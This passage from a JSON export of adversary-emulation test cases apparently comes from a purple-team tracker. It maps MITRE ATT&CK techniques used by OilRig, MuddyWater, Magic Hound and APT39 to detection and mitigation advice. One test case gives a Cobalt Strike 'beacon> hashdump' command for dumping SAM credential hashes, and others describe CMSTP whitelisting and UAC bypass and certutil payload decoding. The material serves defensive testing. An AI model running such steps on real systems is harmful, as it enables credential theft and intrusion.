etc."],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"automation":{"command":"","executor":"command_prompt","inputArgs":[]},"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--86a3338b-8ce6-4dbc-a986-ce1b0e531d11","vectrId":"86a3338b-8ce6-4dbc-a986-ce1b0e531d11","name":null,"offset":0,"createTime":1.578492474485E12,"updateTime":1.578492474485E12,"phaseId":"cc4c7093-0b33-4cf6-95a7-eff607c86c79","templateId":"86a3338b-8ce6-4dbc-a986-ce1b0e531d11","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"Deobfuscate/Decode Files or Information","variant":"OilRig - Deobfuscate/Decode Files or Information - certutil","objective":"Adversaries may use [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027) to hide artifacts of an intrusion from analysis. They may require separate mechanisms to decode or deobfuscate that information depending on how they intend to use it. Methods for doing that include built-in functionality of malware, [Scripting](https://attack.mitre.org/techniques/T1064), [PowerShell](https://attack.mitre.org/techniques/T1086), or by using utilities present on the system.\n\nOne such example is use of [certutil](https://attack.mitre.org/software/S0160) to decode a remote access tool portable executable file that has been hidden inside a certificate file. (Citation: Malwarebytes Targeted Attack against Saudi Arabia)\n\nAnother example is using the Windows <code>copy /b</code> command to reassemble binary fragments into a malicious payload. (Citation: Carbon Black Obfuscation Sept 2016)\n\nPayloads may be compressed, archived, or encrypted in order to avoid detection.  These payloads may be used with [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027) during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open it for deobfuscation or decryption as part of [User Execution](https://attack.mitre.org/techniques/T1204). The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. (Citation: Volexity PowerDuke November 2016) Adversaries may also used compressed or archived scripts, such as Javascript.\n---\n[certutil](https://attack.mitre.org/software/S0160) is a command-line utility that can be used to obtain certificate authority information and configure Certificate Services. (Citation: TechNet Certutil)","command":"A [OilRig](https://attack.mitre.org/groups/G0049) macro has run a PowerShell command to decode file contents. [OilRig](https://attack.mitre.org/groups/G0049) has also used [certutil](https://attack.mitre.org/software/S0160) to decode base64-encoded files on victims.[certutil](https://attack.mitre.org/software/S0160) has been used to decode binaries hidden inside certificate files as Base64 information.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":["2b8ddd46-e0f0-4db7-bf0d-ba1854dbea36"],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--3ccef7ae-cb5e-48f6-8302-897105fbf55c","relationship--67469b79-67e2-4932-9776-b09a82871723","relationship--8104dfee-8883-4f7c-8f7d-84c9b409efc3","course-of-action--d01f473f-3cdc-4867-9e55-1de9cf1986f0","tool--0a68f1f1-da74-4d28-8d9a-696c082706cc","relationship--5918cee6-c2f1-41be-ab96-36f3d17e5293","intrusion-set--4ca1929c-7d64-4aab-b849-badbfc0c760d"]}],"references":["Adair, S.. (2016, November 9). PowerDuke: Widespread Post-Election Spear Phishing Campaigns Targeting Think Tanks and NGOs. Retrieved January 11, 2017. https://www.volexity.com/blog/2016/11/09/powerduke-post-election-spear-phishing-campaigns-targeting-think-tanks-and-ngos/","Falcone, R. and Lee, B. (2017, October 9). OilRig Group Steps Up Attacks with New Delivery Documents and New Injector Trojan. Retrieved January 8, 2018. https://researchcenter.paloaltonetworks.com/2017/10/unit42-oilrig-group-steps-attacks-new-delivery-documents-new-injector-trojan/","Lee, B., Falcone, R. (2018, February 23). OopsIE! OilRig Uses ThreeDollars to Deliver New Trojan. Retrieved July 16, 2018. https://researchcenter.paloaltonetworks.com/2018/02/unit42-oopsie-oilrig-uses-threedollars-deliver-new-trojan/","Malwarebytes Labs. (2017, March 27). New targeted attack against Saudi Arabia Government. Retrieved July 3, 2017. https://blog.malwarebytes.com/cybercrime/social-engineering-cybercrime/2017/03/new-targeted-attack-saudi-arabia-government/","Microsoft. (2012, November 14). Certutil. Retrieved July 3, 2017. https://technet.microsoft.com/library/cc732443.aspx","Sardiwal, M, et al. (2017, December 7). New Targeted Attack in the Middle East by APT34, a Suspected Iranian Threat Group, Using CVE-2017-11882 Exploit. Retrieved December 20, 2017. https://www.fireeye.com/blog/threat-research/2017/12/targeted-attack-in-middle-east-by-apt34.html","Tedesco, B. (2016, September 23). Security Alert Summary. Retrieved February 12, 2018. https://www.carbonblack.com/2016/09/23/security-advisory-variants-well-known-adware-families-discovered-include-sophisticated-obfuscation-techniques-previously-associated-nation-state-attacks/"],"mitreId":"T1140"},"blueTeam":{"successfulDetectionBehaviors":["Identify unnecessary system utilities or potentially malicious software that may be used to deobfuscate or decode files or information, and audit and/or block them by using whitelisting (Citation: Beechey 2010) tools, like AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP)"],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"automation":{"command":"","executor":"command_prompt","inputArgs":[]},"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--877b2c88-f656-4f7c-aed1-62bec99cef1b","vectrId":"877b2c88-f656-4f7c-aed1-62bec99cef1b","name":null,"offset":0,"createTime":1.578492474485E12,"updateTime":1.578492474485E12,"phaseId":"69a00d73-ea90-401c-8ef0-9fcd1785d0b4","templateId":"877b2c88-f656-4f7c-aed1-62bec99cef1b","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"Commonly Used Port","variant":"OilRig - Commonly Used Port - FTP","objective":"Adversaries may communicate over a commonly used port to bypass firewalls or network detection systems and to blend with normal network activity to avoid more detailed inspection. They may use commonly open ports such as\n\n* TCP:80 (HTTP)\n* TCP:443 (HTTPS)\n* TCP:25 (SMTP)\n* TCP/UDP:53 (DNS)\n\nThey may use the protocol associated with the port or a completely different protocol. \n\nFor connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), examples of common ports are \n\n* TCP/UDP:135 (RPC)\n* TCP/UDP:22 (SSH)\n* TCP/UDP:3389 (RDP)\n---\n[FTP](https://attack.mitre.org/software/S0095) is a utility commonly available with operating systems to transfer information over the File Transfer Protocol (FTP). Adversaries can use it to transfer other tools onto a system or to exfiltrate data. (Citation: Wikipedia FTP)","command":"[OilRig](https://attack.mitre.org/groups/G0049) has used port 80 to call back to the C2 server.\tNetwork intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific protocol used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.\n---\nConfigure internal and external firewalls to block traffic using common ports that associate to network protocols that may be unnecessary for that particular network segment.\n---\n[FTP](https://attack.mitre.org/software/S0095) operates over ports 21 and 20.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":["001ff422-5ce9-9680-42ab-fe0247831238"],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--f879d51c-5476-431c-aedf-f14d207e4d1e","relationship--596a70db-9d67-4d1e-8509-808fbb6168f3","relationship--a34d1e30-dcf5-4743-93e5-e4834e980f0f","course-of-action--7c1796c7-9fc3-4c3e-9416-527295bf5d95","relationship--a1505946-76d9-4acb-8b1a-02c926915702","course-of-action--12241367-a8b7-49b4-b86e-2236901ba50c","relationship--205b99bf-ce60-4bb5-8916-ac9d97ce4d05","course-of-action--86598de0-b347-4928-9eb0-0acbfc21908c","tool--cf23bf4a-e003-4116-bbae-1ea6c558d565","relationship--05352dad-ecbb-477c-a05c-5eb3d67ae9ae","intrusion-set--4ca1929c-7d64-4aab-b849-badbfc0c760d"]}],"references":["Bromiley, M., et al.. (2019, July 18). Hard Pass: Declining APT34’s Invite to Join Their Professional Network. Retrieved August 26, 2019. https://www.fireeye.com/blog/threat-research/2019/07/hard-pass-declining-apt34-invite-to-join-their-professional-network.html","Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016. https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf","Wikipedia. (2016, June 15). File Transfer Protocol. Retrieved July 20, 2016. https://en.wikipedia.org/wiki/File_Transfer_Protocol"],"mitreId":"T1043"},"blueTeam":{"successfulDetectionBehaviors":["Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific protocol used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools. (Citation: University of Birmingham C2)","Use intrusion detection signatures to block traffic at network boundaries.","Architect sections of the network to isolate critical systems, functions, or resources. Use physical and logical segmentation to prevent access to potentially sensitive systems and information. Use a DMZ to contain any internet-facing services that should not be exposed from the internal network."],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"automation":{"command":"","executor":"command_prompt","inputArgs":[]},"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--88bfefb5-4817-4fcd-83dc-9b21b8b3bfb8","vectrId":"88bfefb5-4817-4fcd-83dc-9b21b8b3bfb8","name":null,"offset":0,"createTime":1.578492474485E12,"updateTime":1.578492474485E12,"phaseId":"bb51fb2c-dc2f-40dc-9e1b-f3f33f7d5675","templateId":"88bfefb5-4817-4fcd-83dc-9b21b8b3bfb8","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"Data Compressed","variant":"Magic Hound - Data Compressed - Pupy","objective":"An adversary may compress data (e.g., sensitive documents) that is collected prior to exfiltration in order to make it portable and minimize the amount of data sent over the network. The compression is done separately from the exfiltration channel and is performed using a custom program or algorithm, or a more common compression library or utility such as 7zip, RAR, ZIP, or zlib.\n---\n[Pupy](https://attack.mitre.org/software/S0192) is an open source, cross-platform (Windows, Linux, OSX, Android) remote administration and post-exploitation tool. (Citation: GitHub Pupy) It is written in Python and can be generated as a payload in several different ways (Windows exe, Python file, PowerShell oneliner/file, Linux elf, APK, Rubber Ducky, etc.). (Citation: GitHub Pupy) [Pupy](https://attack.mitre.org/software/S0192) is publicly available on GitHub. (Citation: GitHub Pupy)","command":"[Magic Hound](https://attack.mitre.org/groups/G0059) has used RAR to stage and compress local folders.Network intrusion prevention or data loss prevention tools may be set to block specific file types from leaving the network over unencrypted channels. An adversary may move to an encrypted channel or use other mechanisms of encapsulating the traffic in these situations.\n---\n[Pupy](https://attack.mitre.org/software/S0192) can compress data with Zip before sending it over C2.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":["5a7984d4-d134-4fbd-ab45-5dfa73bfd16b"],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--b9f5dbe2-4c55-4fc5-af2e-d42c1d182ec4","relationship--d8609889-3d3e-4f6c-8f52-03ec41876b4d","relationship--36a41a30-61ce-4c55-9916-0a572dfe6d36","course-of-action--12241367-a8b7-49b4-b86e-2236901ba50c","relationship--ea46cbd0-7134-4ede-a117-47380ddd9b5c","course-of-action--28adf6fd-ab6c-4553-9aa7-cef18a191f33","tool--cb69b20d-56d0-41ab-8440-4a4b251614d4","relationship--d1ee6feb-91cb-4cac-ae57-e71358af29c2","intrusion-set--f9d6633a-55e6-4adc-9263-6ae080421a13"]}],"references":["Mandiant. (2018). Mandiant M-Trends 2018. Retrieved July 9, 2018. https://www.fireeye.com/content/dam/collateral/en/mtrends-2018.pdf","Nicolas Verdier. (n.d.). Retrieved January 29, 2018. https://github.com/n1nj4sec/pupy","Wikipedia. (2016, March 31). List of file signatures. Retrieved April 22, 2016. https://en.wikipedia.org/wiki/List_of_file_signatures"],"mitreId":"T1002"},"blueTeam":{"successfulDetectionBehaviors":["Use intrusion detection signatures to block traffic at network boundaries.","Identify unnecessary system utilities, third-party tools, or potentially malicious software that may be used to compress files, and audit and/or block them by using whitelisting (Citation: Beechey 2010) tools, like AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP)\n\nIf network intrusion prevention or data loss prevention tools are set to block specific file types from leaving the network over unencrypted channels, then an adversary may move to an encrypted channel."],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"automation":{"command":"","executor":"command_prompt","inputArgs":[]},"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--8c27541e-dcbe-4124-a260-280af66b1f59","vectrId":"8c27541e-dcbe-4124-a260-280af66b1f59","name":null,"offset":0,"createTime":1.578492474485E12,"updateTime":1.578492474485E12,"phaseId":"bb51fb2c-dc2f-40dc-9e1b-f3f33f7d5675","templateId":"8c27541e-dcbe-4124-a260-280af66b1f59","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"Data Compressed","variant":"APT39 - Data Compressed","objective":"An adversary may compress data (e.g., sensitive documents) that is collected prior to exfiltration in order to make it portable and minimize the amount of data sent over the network. The compression is done separately from the exfiltration channel and is performed using a custom program or algorithm, or a more common compression library or utility such as 7zip, RAR, ZIP, or zlib.","command":"[APT39](https://attack.mitre.org/groups/G0087) has used WinRAR and 7-Zip to compress an archive stolen data.Network intrusion prevention or data loss prevention tools may be set to block specific file types from leaving the network over unencrypted channels. An adversary may move to an encrypted channel or use other mechanisms of encapsulating the traffic in these situations.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":[],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--b9f5dbe2-4c55-4fc5-af2e-d42c1d182ec4","relationship--5d4ba3fe-d782-47e4-ad82-0b81142a5e1a","relationship--36a41a30-61ce-4c55-9916-0a572dfe6d36","course-of-action--12241367-a8b7-49b4-b86e-2236901ba50c","relationship--ea46cbd0-7134-4ede-a117-47380ddd9b5c","course-of-action--28adf6fd-ab6c-4553-9aa7-cef18a191f33","intrusion-set--44e43fad-ffcb-4210-abcf-eaaed9735f80"]}],"references":["Hawley et al. (2019, January 29). APT39: An Iranian Cyber Espionage Group Focused on Personal Information. Retrieved February 19, 2019. https://www.fireeye.com/blog/threat-research/2019/01/apt39-iranian-cyber-espionage-group-focused-on-personal-information.html","Wikipedia. (2016, March 31). List of file signatures. Retrieved April 22, 2016. https://en.wikipedia.org/wiki/List_of_file_signatures"],"mitreId":"T1002"},"blueTeam":{"successfulDetectionBehaviors":["Use intrusion detection signatures to block traffic at network boundaries.","Identify unnecessary system utilities, third-party tools, or potentially malicious software that may be used to compress files, and audit and/or block them by using whitelisting (Citation: Beechey 2010) tools, like AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP)\n\nIf network intrusion prevention or data loss prevention tools are set to block specific file types from leaving the network over unencrypted channels, then an adversary may move to an encrypted channel."],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"automation":{"command":"","executor":"command_prompt","inputArgs":[]},"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--8c7894f4-c52a-4e66-ab54-a0e837a0e7ec","vectrId":"8c7894f4-c52a-4e66-ab54-a0e837a0e7ec","name":null,"offset":0,"createTime":1.578492474485E12,"updateTime":1.578492474485E12,"phaseId":"47da3f56-d9fc-4735-a343-b57b4ad8eca5","templateId":"8c7894f4-c52a-4e66-ab54-a0e837a0e7ec","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"Web Shell","variant":"OilRig - Web Shell","objective":"A Web shell is a Web script that is placed on an openly accessible Web server to allow an adversary to use the Web server as a gateway into a network. A Web shell may provide a set of functions to execute or a command-line interface on the system that hosts the Web server. In addition to a server-side script, a Web shell may have a client interface program that is used to talk to the Web server (see, for example, China Chopper Web shell client). (Citation: Lee 2013)\n\nWeb shells may serve as [Redundant Access](https://attack.mitre.org/techniques/T1108) or as a persistence mechanism in case an adversary's primary access methods are detected and removed.","command":"[OilRig](https://attack.mitre.org/groups/G0049) has used Web shells, often to maintain access to a victim network.Audit account and group permissions to ensure that accounts used to manage servers do not overlap with accounts and permissions of users in the internal network that could be acquired through Credential Access and used to log into the Web server and plant a Web shell or pivot from the Web server into the internal network.\n---\nEnsure that externally facing Web servers are patched regularly to prevent adversary access through [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068) to gain remote code access or through file inclusion weaknesses that may allow adversaries to upload files or scripts that are automatically served as Web pages.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":[],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--c16e5409-ee53-4d79-afdc-4099dc9292df","relationship--2dbed740-1b50-4d59-a729-a1d9e6a839df","relationship--957ca941-c089-4059-ba09-1c1d4cf62881","course-of-action--9bb9e696-bff8-4ae1-9454-961fc7d91d5f","relationship--38d4c148-6fe8-4703-94e5-1b79b1cf5b8c","course-of-action--bcc91b8c-f104-4710-964e-1d5409666736","relationship--d0a4f78d-4257-4597-ade6-ac9e0c527775","course-of-action--e5d930e9-775a-40ad-9bdb-b941d8dfe86b","intrusion-set--4ca1929c-7d64-4aab-b849-badbfc0c760d"]}],"references":["Davis, S. and Caban, D. (2017, December 19). APT34 - New Targeted Attack in the Middle East. Retrieved December 20, 2017. https://www.brighttalk.com/webcast/10703/296317/apt34-new-targeted-attack-in-the-middle-east","Lee, T., Hanzlik, D., Ahl, I. (2013, August 7). Breaking Down the China Chopper Web Shell - Part I. Retrieved March 27, 2015. https://www.fireeye.com/blog/threat-research/2013/08/breaking-down-the-china-chopper-web-shell-part-i.html","US-CERT. (2015, November 13). Compromised Web Servers and Web Shells - Threat Awareness and Guidance. Retrieved June 8, 2016. https://www.us-cert.gov/ncas/alerts/TA15-314A","Unit 42. (2017, December 15). Unit 42 Playbook Viewer. Retrieved December 20, 2017. https://pan-unit42.github.io/playbook_viewer/"],"mitreId":"T1100"},"blueTeam":{"successfulDetectionBehaviors":["Manage the creation, modification, use, and permissions associated to privileged accounts, including SYSTEM and root.","Ensure that externally facing Web servers are patched regularly to prevent adversary access through [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068) to gain remote code access or through file inclusion weaknesses that may allow adversaries to upload files or scripts that are automatically served as Web pages. \n\nAudit account and group permissions to ensure that accounts used to manage servers do not overlap with accounts and permissions of users in the internal network that could be acquired through Credential Access and used to log into the Web server and plant a Web shell or pivot from the Web server into the internal network. (Citation: US-CERT Alert TA15-314A Web Shells)","Perform regular software updates to mitigate exploitation risk."],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"automation":{"command":"","executor":"command_prompt","inputArgs":[]},"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--935f84cb-1c15-4c8f-8808-01f5207c9958","vectrId":"935f84cb-1c15-4c8f-8808-01f5207c9958","name":"","offset":0,"createTime":1.551996248072E12,"updateTime":1.551996248072E12,"phaseId":"01d77cc8-b129-413b-adf5-850cebc4ae79","templateId":"935f84cb-1c15-4c8f-8808-01f5207c9958","icon":"icons/terminal-black-alt-2.svg","redTeam":{"trueAttackStartTimelineId":"","trueAttackEndTimelineId":"","status":"NotPerformed","method":"Credential Dumping","variant":"Extract SAM Hashes via Beacon Hashdump","objective":"Use beacon's hashdump to extract credentials from the local SAM database","command":"beacon> hashdump","likelihood":"Low","risk":"Low","internalExternal":"Internal","stealth":"Medium","attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":["9d8e81e7-127f-464e-8671-bfdc6cced3d5"],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[],"references":null,"mitreId":"T1003"},"blueTeam":{"successfulDetectionBehaviors":["1) Suspicious process execution is blocked by EDR or other endpoint security tool","2) Enable additional LSA protections to prevent traditional process dumping of LSASS"],"expectedDetectionLayerIds":["54c70ef6-1e4a-4613-a99d-692230cb557a","765c22af-e010-4b4d-9ba5-86e1ae6c916d","860cc9bc-4da2-4698-889b-e96cca9e4bf3"],"blueTeamProductIds":[],"outcomeNotes":"","trueDetectionTimelineId":"","alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":["1) Suspicious process execution is detected by EDR or other endpoint security tool, or alerted in SIEM based on Windows or sysmon event IDs"]},"evidenceFiles":[],"organizationIds":["1cf413ba-326a-4d18-979c-367eb1306f69"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"automation":{"command":"","executor":"command_prompt","inputArgs":[]},"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--936ee652-351e-4867-958d-13351620fbe6","vectrId":"936ee652-351e-4867-958d-13351620fbe6","name":null,"offset":0,"createTime":1.574779748235E12,"updateTime":1.574779748235E12,"phaseId":"772a480f-21d2-4d3b-bc7d-ef9ac82fc46b","templateId":"936ee652-351e-4867-958d-13351620fbe6","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"CMSTP","variant":"MuddyWater - CMSTP","objective":"The Microsoft Connection Manager Profile Installer (CMSTP.exe) is a command-line program used to install Connection Manager service profiles. (Citation: Microsoft Connection Manager Oct 2009) CMSTP.exe accepts an installation information file (INF) as a parameter and installs a service profile leveraged for remote access connections.\n\nAdversaries may supply CMSTP.exe with INF files infected with malicious commands. (Citation: Twitter CMSTP Usage Jan 2018) Similar to [Regsvr32](https://attack.mitre.org/techniques/T1117) / ”Squiblydoo”, CMSTP.exe may be abused to load and execute DLLs (Citation: MSitPros CMSTP Aug 2017)  and/or COM scriptlets (SCT) from remote servers. (Citation: Twitter CMSTP Jan 2018) (Citation: GitHub Ultimate AppLocker Bypass List) (Citation: Endurant CMSTP July 2018) This execution may also bypass AppLocker and other whitelisting defenses since CMSTP.exe is a legitimate, signed Microsoft application.\n\nCMSTP.exe can also be abused to [Bypass User Account Control](https://attack.mitre.org/techniques/T1088) and execute arbitrary commands from a malicious INF through an auto-elevated COM interface. (Citation: MSitPros CMSTP Aug 2017) (Citation: GitHub Ultimate AppLocker Bypass List) (Citation: Endurant CMSTP July 2018)","command":"[MuddyWater](https://attack.mitre.org/groups/G0069) has used CMSTP.exe and a malicious INF to execute its [POWERSTATS](https://attack.mitre.org/software/S0223) payload.Consider using application whitelisting configured to block execution of CMSTP.exe if it is not required for a given system or network to prevent potential misuse by adversaries.\n---\nCMSTP.exe may not be necessary within a given environment (unless using it for VPN connection installation).","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":[],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--7d6f590f-544b-45b4-9a42-e0805f342af3","relationship--3dad318f-b446-49c6-a62b-f0596b63a9c5","relationship--dc317420-200a-40e1-97f0-4d76f5f3412f","course-of-action--47e0e9fe-96ce-4f65-8bb1-8be1feacb5db","relationship--162d2d29-7810-499c-a9ab-08b60cd0e713","course-of-action--91816292-3686-4a6e-83c4-4c08513b9b57","relationship--add62ca8-e30a-4f6c-8186-770956f85305","course-of-action--eb88d97c-32f1-40be-80f0-d61a4b0b4b31","intrusion-set--269e8108-68c6-4f99-b911-14b2e765dec2"]}],"references":["Carr, N. (2018, January 31). Here is some early bad cmstp.exe... Retrieved April 11, 2018. https://twitter.com/ItsReallyNick/status/958789644165894146","Microsoft. (2009, October 8). How Connection Manager Works. Retrieved April 11, 2018. https://docs.microsoft.com/previous-versions/windows/it-pro/windows-server-2003/cc786431(v=ws.10)","Moe, O. (2017, August 15). Research on CMSTP.exe. Retrieved April 11, 2018. https://msitpros.com/?p=3960","Moe, O. (2018, March 1). Ultimate AppLocker Bypass List. Retrieved April 10, 2018. https://github.com/api0cradle/UltimateAppLockerByPassList","Seetharaman, N. (2018, July 7). Detecting CMSTP-Enabled Code Execution and UAC Bypass With Sysmon.. Retrieved August 6, 2018. http://www.endurant.io/cmstp/detecting-cmstp-enabled-code-execution-and-uac-bypass-with-sysmon/","Singh, S. et al.. (2018, March 13). Iranian Threat Group Updates Tactics, Techniques and Procedures in Spear Phishing Campaign. Retrieved April 11, 2018. https://www.fireeye.com/blog/threat-research/2018/03/iranian-threat-group-updates-ttps-in-spear-phishing-campaign.html","Tyrer, N. (2018, January 30). CMSTP.exe - remote .sct execution applocker bypass. Retrieved April 11, 2018. https://twitter.com/NickTyrer/status/958450014111633408"],"mitreId":"T1191"},"blueTeam":{"successfulDetectionBehaviors":["Block execution of code on a system through application whitelisting, blacklisting, and/or script blocking.","CMSTP.exe may not be necessary within a given environment (unless using it for VPN connection installation). Consider using application whitelisting configured to block execution of CMSTP.exe if it is not required for a given system or network to prevent potential misuse by adversaries. (Citation: MSitPros CMSTP Aug 2017)","Remove or deny access to unnecessary and potentially vulnerable software to prevent abuse by adversaries."],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--993918e1-562c-40d5-89c6-08aa6beb2db2","vectrId":"993918e1-562c-40d5-89c6-08aa6beb2db2","name":null,"offset":0,"createTime":1.574779748235E12,"updateTime":1.574779748235E12,"phaseId":"549e7bc3-0b2b-46bc-a6d7-81bf0679c1b3","templateId":"993918e1-562c-40d5-89c6-08aa6beb2db2","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"File and Directory Discovery","variant":"MuddyWater - File and Directory Discovery","objective":"Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from [File and Directory Discovery](https://attack.mitre.org/techniques/T1083) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\n### Windows\n\nExample utilities used to obtain this information are <code>dir</code> and <code>tree</code>. (Citation: Windows Commands JPCERT) Custom tools may also 